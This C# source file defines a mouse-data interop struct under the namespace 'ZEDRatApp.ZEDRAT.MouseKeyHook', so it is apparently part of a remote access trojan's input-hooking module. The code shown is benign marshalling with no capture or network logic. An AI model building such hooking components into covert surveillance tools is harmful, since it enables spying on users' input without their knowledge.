using System;
using System.Drawing;
using System.Runtime.InteropServices;

namespace ZEDRatApp.ZEDRAT.MouseKeyHook.WinApi
{
	[StructLayout(LayoutKind.Explicit)]
	internal struct AppMouseStruct
	{
		[FieldOffset(0)]
		public Point Point;

		[FieldOffset(22)]
		public short MouseData_x86;

		[FieldOffset(34)]
		public short MouseData_x64;

		public MouseStruct ToMouseStruct()
		{
			MouseStruct result = default(MouseStruct);
			result.Point = this.Point;
			result.MouseData = ((IntPtr.Size == 4) ? this.MouseData_x86 : this.MouseData_x64);
			result.Timestamp = Environment.TickCount;
			return result;
		}
	}
}
